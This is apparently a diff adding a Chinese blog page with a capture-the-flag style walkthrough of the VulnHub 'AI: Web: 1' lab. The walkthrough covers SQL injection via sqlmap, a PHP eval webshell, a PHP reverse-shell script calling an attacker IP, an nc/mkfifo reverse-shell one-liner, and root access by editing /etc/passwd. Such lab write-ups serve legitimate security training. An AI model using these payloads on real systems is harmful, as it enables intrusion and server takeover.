@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="思路：进行主机、端口扫描后进行drib进行目录爆破——找到sql注入页面——获取os-shell——反弹shell至攻击机——提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AI-WEB-1.0">
+<meta property="og:url" content="http://example.com/2023/06/27/AI-WEB-1-0/index.html">
+<meta property="og:site_name" content="阿卡丽的神秘商店">
+<meta property="og:description" content="思路：进行主机、端口扫描后进行drib进行目录爆破——找到sql注入页面——获取os-shell——反弹shell至攻击机——提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627204534720.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627210713381.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627211608307.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627212141024.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627212329732.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627212422474.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627212516544.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627212603322.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627215150636.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627215124147.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627215356887.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627215500355.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628085709747.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628085759951.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628090047794.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628090220800.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628090936165.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628091005743.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628091133478.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628091613025.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628092816797.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628093051581.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628093401833.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628093419589.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628094800799.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628094819292.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628094850683.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628095037904.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628095417249.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628102648310.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628102712207.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628102847493.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628104508215.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628104738569.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628104925500.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628115338538.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628115308244.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628171715033.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628171956800.png">
+<meta property="og:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230628172140914.png">
+<meta property="article:published_time" content="2023-06-27T12:44:49.000Z">
+<meta property="article:modified_time" content="2023-07-02T22:39:41.366Z">
+<meta property="article:author" content="akali">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/06/27/AI-WEB-1-0/image-20230627204534720.png">
+
+<link rel="canonical" href="http://example.com/2023/06/27/AI-WEB-1-0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>AI-WEB-1.0 | 阿卡丽的神秘商店</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">阿卡丽的神秘商店</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">上古时代的宝贝开卖了</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/gjy20001003" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/27/AI-WEB-1-0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="akali">
+      <meta itemprop="description" content="远赴人间惊鸿宴，一睹人间盛世颜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="阿卡丽的神秘商店">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AI-WEB-1.0
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-27 20:44:49" itemprop="dateCreated datePublished" datetime="2023-06-27T20:44:49+08:00">2023-06-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-03 06:39:41" itemprop="dateModified" datetime="2023-07-03T06:39:41+08:00">2023-07-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>思路：进行主机、端口扫描后进行drib进行目录爆破——找到sql注入页面——获取os-shell——反弹shell至攻击机——提权</p>
+<span id="more"></span>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>kali、sqlmap、answord、burp suite</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描靶机地址"><a href="#扫描靶机地址" class="headerlink" title="扫描靶机地址"></a>扫描靶机地址</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627204534720.png" alt="image-20230627204534720"></p>
+<p>得到靶机地址192.168.153.143</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627210713381.png" alt="image-20230627210713381"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627211608307.png" alt="image-20230627211608307"></p>
+<p>看到两个路径，访问后发现没有权限。</p>
+<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627212141024.png" alt="image-20230627212141024"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627212329732.png" alt="image-20230627212329732"></p>
+<p>发现三个网页，一一查看<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212422474.png" alt="image-20230627212422474"><br>等下用geogle搜一下<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212516544.png" alt="image-20230627212516544"><br>这里提到的两个路径是当时被拒绝的路径<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212603322.png" alt="image-20230627212603322"><br>权限拒绝</p>
+<h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><p>沿着目录继续爆破<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627215150636.png" alt="image-20230627215150636"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627215124147.png" alt="image-20230627215124147"></p>
+<p>从info.php中得到以下信息<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627215356887.png" alt="image-20230627215356887"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627215500355.png" alt="image-20230627215500355"></p>
+<p>得到两个路径，第一个访问是一个搜索栏，尝试sql注入，第二个状态码301，页面被重定向等下看</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628085709747.png" alt="image-20230628085709747"><br>输入1正常返回，输入1‘产生报错信息，考虑联合查询<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628085759951.png" alt="image-20230628085759951" style="zoom:67%;"><img src="/2023/06/27/AI-WEB-1-0/image-20230628090047794.png" alt="image-20230628090047794" style="zoom:67%;"><img src="/2023/06/27/AI-WEB-1-0/image-20230628090220800.png" alt="image-20230628090220800" style="zoom:67%;"></p>
+<p>考虑为字符型注入，bp抓包分析一下可以得到注入点是uid=1&amp;Operation==Submit</p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628090936165.png" alt="image-20230628090936165" style="zoom: 80%;"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628091005743.png" alt="image-20230628091005743" style="zoom:80%;"></p>
+<p>得到字段数为3，获取数据库名和版本号<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628091133478.png" alt="image-20230628091133478"></p>
+<p>获取表名的时候发现没有使用select的权限<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628091613025.png" alt="image-20230628091613025"></p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/i</span><br><span class="line">ndex.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628092816797.png" alt="image-20230628092816797"></p>
+<p>可以看到有两个数据库分别是aiweb1和infornation_schema，存在四种类型sql注入漏洞。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/index.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093051581.png" alt="image-20230628093051581"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/index.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -T user --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093401833.png" alt="image-20230628093401833"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093419589.png" alt="image-20230628093419589"></p>
+<p>然后看看是否有敏感信息可以查看，然后就执行os-shell吧。</p>
+<h3 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094800799.png" alt="image-20230628094800799"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094819292.png" alt="image-20230628094819292"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094850683.png" alt="image-20230628094850683"></p>
+<p>绝对路径查看info.php，得到绝对路径/home/www/html/web1x443290o2sdf92213<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628095037904.png" alt="image-20230628095037904"><br>结合之前看到的se3reTdir777/uploads/来上传shell</p>
+<p>成功进入shell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628095417249.png" alt="image-20230628095417249"></p>
+<p>上传一句话木马，内容：$&lt;?php @eval($_POST[‘akali’]);?&gt;，通过sqlmap上传木马<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102648310.png" alt="image-20230628102648310"></p>
+<p>可以看到成功上传<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102712207.png" alt="image-20230628102712207"></p>
+<p>或者使用反弹shell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102847493.png" alt="image-20230628102847493"><br>创建webshell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.50.129&quot;</span>,<span class="number">8888</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用os-shell下载webshell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628104508215.png" alt="image-20230628104508215"></p>
+<h3 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628104738569.png" alt="image-20230628104738569"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628104925500.png" alt="image-20230628104925500"></p>
+<p>正向连接</p>
+<p>攻击机开启监听，靶机连接至攻击机，发现nc无-e命令，选择绕过</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>z;cat <span class="regexp">/tmp/</span>z|<span class="regexp">/bin/</span>bash -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc ip port &gt; <span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>
+<p>反向连接</p>
+<p>攻击机开启监听并开启http服务，上传webshell.php，靶机下载webshell.php并允许，反弹shell至攻击机</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现用户是低权限用户<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628115338538.png" alt="image-20230628115338538"></p>
+<p>查看内核版本，版本为18.04.3<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628115308244.png" alt="image-20230628115308244"></p>
+<p>创建用户，生成md5加密密码并写入passwd中<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628171715033.png" alt="image-20230628171715033"><br>切换环境后切换用户<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628171956800.png" alt="image-20230628171956800"></p>
+<p>获取root权限，找到目标文件<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628172140914.png" alt="image-20230628172140914"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/" rel="prev" title="shell">
+      <i class="fa fa-chevron-left"></i> shell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/28/Att-ck%E8%AF%A6%E8%A7%A3/" rel="next" title="Att&ck详解">
+      Att&ck详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.1.</span> <span class="nav-text">靶机地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.2.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.</span> <span class="nav-text">扫描靶机地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%89%AB"><span class="nav-number">2.3.</span> <span class="nav-text">漏扫</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95"><span class="nav-number">2.4.</span> <span class="nav-text">爆破目录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">3.2.</span> <span class="nav-text">sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os-shell"><span class="nav-number">3.3.</span> <span class="nav-text">os-shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.4.</span> <span class="nav-text">蚁剑连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="akali"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">akali</p>
+  <div class="site-description" itemprop="description">远赴人间惊鸿宴，一睹人间盛世颜</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">100</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1859652717&auto=1&height=66"></iframe>
+        </iframe>
+      </div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">akali</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+<!-- 页面点击出现爱心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
